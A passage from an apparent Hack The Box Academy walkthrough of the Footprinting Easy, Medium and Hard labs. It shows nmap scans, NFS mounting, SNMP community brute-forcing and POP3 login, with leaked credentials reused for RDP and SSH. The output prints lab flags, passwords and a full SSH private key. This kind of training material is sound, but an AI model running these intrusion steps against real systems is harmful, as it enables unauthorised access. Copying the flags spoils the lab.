We godt the id_rsa file.

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Easy]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/HTB/Footprinting/Easy]
└─$ sudo ssh ceil@10.129.152.232 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 26 Jan 2023 07:29:30 PM UTC

  System load:  0.0               Processes:               177
  Usage of /:   86.3% of 3.87GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 10.129.152.232
  Swap usage:   0%

  => / is using 86.3% of 3.87GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

116 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$ pwd
/home/ceil
ceil@NIXEASY:~$ cd ..
ceil@NIXEASY:/home$ ls
ceil  cry0l1t3  flag
ceil@NIXEASY:/home$ cd flag
ceil@NIXEASY:/home/flag$ ls
flag.txt
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

**Answer:** `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

---
## Footprinting Lab - Medium
### Question:
![](./attachments/Pasted%20image%2020230126175212.png)
*Hint: In SQL Management Studio, we can edit the last 200 entries of the selected database and read the entries accordingly. We also need to keep in mind, that each Windows system has an Administrator account.*

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Medium]
└─$ nmap -n -sV -sC -oA nmap_sV_sC_top1000_scan 10.129.108.68
Nmap scan report for 10.129.108.68
Host is up (0.041s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-01-26T19:37:23+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2023-01-26T19:37:15+00:00
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2023-01-25T19:35:49
|_Not valid after:  2023-07-27T19:35:49
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-26T19:37:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 26 14:37:53 2023 -- 1 IP address (1 host up) scanned in 88.28 seconds
```

NFS and RDP is running on the server.

Let's mount the NFS share.

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Medium]
└─$ sudo mount -t nfs 10.129.109.214:/ ./mnt/ -o nolock
[sudo] password for kali: 

┌──(kali㉿kali)-[~/HTB/Footprinting/Medium]
└─$ tree
.
├── mnt
│   └── TechSupport  [error opening dir]
├── nmap_sV_nfsScritp_111,2049_scan.gnmap
├── nmap_sV_nfsScritp_111,2049_scan.nmap
├── nmap_sV_nfsScritp_111,2049_scan.xml
├── nmap_sV_sC_111,135,139,445,2049,3389_scan.gnmap
├── nmap_sV_sC_111,135,139,445,2049,3389_scan.nmap
├── nmap_sV_sC_111,135,139,445,2049,3389_scan.xml
├── nmap_sV_sC_Packet-trace_disbale-arp-ping3389_scan.gnmap
├── nmap_sV_sC_Packet-trace_disbale-arp-ping3389_scan.nmap
├── nmap_sV_sC_Packet-trace_disbale-arp-ping3389_scan.xml
├── nmap_sV_sC_top1000_scan.gnmap
├── nmap_sV_sC_top1000_scan.nmap
└── nmap_sV_sC_top1000_scan.xml

2 directories, 12 files

┌──(kali㉿kali)-[~/HTB/Footprinting/Medium]
└─$ cd mnt/TechSupport              
cd: permission denied: mnt/TechSupport

┌──(kali㉿kali)-[~/HTB/Footprinting/Medium]
└─$ sudo su   

┌──(root㉿kali)-[/home/kali/HTB/Footprinting/Medium]
└─# cd mnt/TechSupport         
  
┌──(root㉿kali)-[/home/…/Footprinting/Medium/mnt/TechSupport]
└─# ls -lah
total 68K
(...)
-rwx------ 1 nobody nogroup 1.3K Nov 10  2021 ticket4238791283782.txt
(...)

┌──(root㉿kali)-[/home/…/Footprinting/Medium/mnt/TechSupport]
└─# cat ticket4238791283782.txt
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }
```

We got a username and password: `alex:lol123!mD`

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:alex /p:'lol123!mD' /v:10.129.109.214
```

![](./attachments/Pasted%20image%2020230127115154.png)

We got access via RDP.

Looking around, we find an interesting file. 

![](./attachments/Pasted%20image%2020230127114141.png)

It might be the password for the `Administrator` account. Let's run the SQL server as administrator and try the password.

User:pass `Administrator:87N1ns@alls83`

![](./attachments/Pasted%20image%2020230127114158.png)

It worked, now we can query the `HTB` user and find the  password.

![](./attachments/Pasted%20image%2020230127114045.png)

**Answer:** `lnch7ehrdn43i7AoqVPK4zWR`

---
## Footprinting Lab - Hard
### Question:
![](./attachments/Pasted%20image%2020230126175220.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Hard]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20 
Scanning 1 hosts, 3220 communities
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

┌──(kali㉿kali)-[~/HTB/Footprinting/Hard]
└─$ snmpwalk -v2c -c backup 10.129.202.20                            
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (300727) 0:50:07.27
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (301863) 0:50:18.63
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E7 01 1B 0B 2F 29 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 159
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

We found what appears to be a username and password.

User:pass `tom:NMds732Js2761`

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Hard]
└─$ openssl s_client -connect 10.129.202.20:pop3s                           
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = NIXHARD
verify return:1
---
Certificate chain
 0 s:CN = NIXHARD
   i:CN = NIXHARD
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov 10 01:30:25 2021 GMT; NotAfter: Nov  8 01:30:25 2031 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
BQAwEjEQMA4GA1UEAwwHTklYSEFSRDAeFw0yMTExMTAwMTMwMjVaFw0zMTExMDgw
MTMwMjVaMBIxEDAOBgNVBAMMB05JWEhBUkQwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDEBpDfkH4Ro5ZXW44NvnF3N9lKz27V1hgRppyUk5y/SEPKt2zj
EU+r2tEHUeHoJHQZBbW0ybxh+X2H3ZPNEG9nV1GtFQfTBVcrUEpN5VV15aIbdh+q
j53pp/wcL/d8+Zg2ZAaVYWvQHVqtsAudQmynrV1MHA39A44fG3/SutKlurY8AKR0
MW5zMPtflMc/N3+lH8UUMBf2Q+zNSyZLiBEihxK3kfMW92HqWeh016egSIFuxUsH
kk4xpGmyG9NDYna47dQzoHCg+42KgqFvWrGw2nIccaEIX5XA8rU9u53C7EQzDzmQ
vAtHpKWBwNmiivxAz/QC7MPExWIWtZtOqxmfAgMBAAGjITAfMAkGA1UdEwQCMAAw
EgYDVR0RBAswCYIHTklYSEFSRDANBgkqhkiG9w0BAQsFAAOCAQEAG+Dm9pLJgNGC
X1YmznmtBUekhXMrU67tQl745fFasJQzIrDgVtK27fjAtQRwvIbDruSwTj47E7+O
XdS7qyjFNBerklWNq4fEAVI7BmkxnTS9542okA/+UmeG70LdKjzFS+LjjOnyWzTh
YwU8uUjLfnRca74kY0DkVHOIkwZQha0J+BrKSADq/zDjkG0g4v0vzHINOmHx9eiE
67NoJKJPY5S3RYWxl/4x8Kphx7PNJBPC75gYjlxxDhxdYu9a3daqJUa58/qOm6P8
w1P9nA6lkg7NopyqepulLAzIcqnTjb/nMD2Pd9b6vgWc3IqSfFreqjzshZ+FjNZo
zR+tR6z4TQ==
-----END CERTIFICATE-----
subject=CN = NIXHARD
issuer=CN = NIXHARD
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1283 bytes and written 503 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: E0FB881713CD9F93C76AB9DE553DC1D9F5D1864C9FC8A9B2B8A807C71F9AE015
    Session-ID-ctx: 
    Resumption PSK: 820FEB2CA1604DCE316BECC73CD771CFFDAF4FAFA930213C28ED5B43291BA5ED7509EC3523AB4B95936D9DB7416290B5
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 3c 50 dc f3 44 63 6c 5e-53 5d 62 65 b1 8a 40 1f   <P..Dcl^S]be..@.
    0010 - 9e 21 6b 69 78 f4 fa 46-d6 88 b1 42 7b 10 5a 16   .!kix..F...B{.Z.
    0020 - af 32 0b dc 82 09 89 b0-f2 64 88 62 12 ab d8 f1   .2.......d.b....
    0030 - 52 cb 6b 3c 1c 70 a4 09-8f 5d 69 79 c7 41 aa 4d   R.k<.p...]iy.A.M
    0040 - 4d d1 ed 2f e5 4d 04 4a-33 62 46 7b fe b7 ff f2   M../.M.J3bF{....
    0050 - c4 3f 1b fe 96 78 78 d5-e0 e5 b2 37 81 30 9d c9   .?...xx....7.0..
    0060 - 88 f9 85 b6 5c b5 92 d0-b0 9e d4 fd 72 cb a4 ee   ....\.......r...
    0070 - fc 36 5c 68 8d 3a 47 35-1c e7 b9 a6 93 c3 84 2f   .6\h.:G5......./
    0080 - 44 0b f0 d3 72 d7 df ac-bd a4 4b 21 7a ea 40 25   D...r.....K!z.@%
    0090 - 19 bf 29 62 29 fb f0 73-fc 59 bf 28 28 8a 3b 99   ..)b)..s.Y.((.;.
    00a0 - 8c ef c1 b0 a9 50 9c 9d-87 9a f1 da 1d bc cc 61   .....P.........a
    00b0 - 23 02 1e f4 14 6a 6a ff-95 10 2c e7 4b 1b 92 44   #....jj...,.K..D

    Start Time: 1674820232
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 02EEDD4C286D981FD9C94581A7527449553EC615E86BD545DBD100EE6037DD84
    Session-ID-ctx: 
    Resumption PSK: 56B476ABE6F37FCD821B339C039B26108FE1990F253323BD01D41A335E86CC3AD60F11A2A74FD976F5F52A2014CC488C
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 3c 50 dc f3 44 63 6c 5e-53 5d 62 65 b1 8a 40 1f   <P..Dcl^S]be..@.
    0010 - 58 b8 1d 9e 77 f3 18 85-a3 ae 74 1e f5 d4 5c aa   X...w.....t...\.
    0020 - 60 44 ea 25 66 db 4b 69-52 90 82 65 90 d4 8a f7   `D.%f.KiR..e....
    0030 - 3f 76 26 5f 83 c4 68 b0-c5 ee 34 d1 c6 64 2f 71   ?v&_..h...4..d/q
    0040 - b0 a6 58 a9 43 9d bb 12-37 14 91 64 95 bc ef bb   ..X.C...7..d....
    0050 - ed 8c e3 d1 ab 03 60 96-62 2b 07 33 d7 bb b8 fc   ......`.b+.3....
    0060 - 92 f8 47 01 53 15 d0 a4-3c 8c 23 18 f8 2f bb 18   ..G.S...<.#../..
    0070 - 64 43 d5 29 6a 18 d4 83-a6 73 b2 f5 2f a5 87 fc   dC.)j....s../...
    0080 - ec 74 ce 92 b9 8c 4a e3-cd 24 39 16 5c 9a c6 d4   .t....J..$9.\...
    0090 - a2 96 7b c5 b7 94 e4 31-48 f0 4b 9c 60 86 04 99   ..{....1H.K.`...
    00a0 - 2d 07 c0 57 54 9e 70 6a-de 98 27 8f bf 63 1d c3   -..WT.pj..'..c..
    00b0 - 2f a8 2b d5 bd a3 35 95-3b 23 0f 74 c6 e0 0f 95   /.+...5.;#.t....

    Start Time: 1674820232
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
+OK Dovecot (Ubuntu) ready.
user tom
+OK
pass NMds732Js2761
+OK Logged in.
stat
+OK 1 3661
list
+OK 1 messages:
1 3661
.
retr 3661
-ERR There's no message 3661.
retr 1 3661
-ERR Noise after message number:  3661
retr 1
+OK 3661 octets
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Hard]
└─$ sudo nano id_rsa
```

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Hard]
└─$ sudo chmod 600 id_rsa

┌──(kali㉿kali)-[~/HTB/Footprinting/Hard]
└─$ sudo ssh tom@10.129.202.20 -i id_rsa
The authenticity of host '10.129.202.20 (10.129.202.20)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.20' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 27 Jan 2023 11:59:54 AM UTC

  System load:  0.0               Processes:               185
  Usage of /:   66.4% of 5.70GB   Users logged in:         0
  Memory usage: 31%               IPv4 address for ens192: 10.129.202.20
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
